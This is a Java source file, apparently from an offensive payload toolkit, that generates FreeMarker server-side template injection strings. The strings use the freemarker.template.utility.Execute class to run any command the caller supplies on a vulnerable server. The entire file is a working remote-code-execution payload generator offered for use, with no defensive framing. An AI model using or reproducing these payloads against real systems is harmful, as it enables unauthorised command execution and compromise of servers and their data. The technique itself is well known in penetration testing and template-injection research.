package cn.butler.template.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;

public class FreeMarkerExecute implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String assignment = String.format("<#assign test=\"freemarker.template.utility.Execute\"?new()> ${test(\"%s\")}",command);
        String implement = String.format("${\"freemarker.template.utility.Execute\"?new()(\"%s\")}",command);
        return assignment+ "\n" +implement;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FreeMarkerExecute.class, args);
    }
}
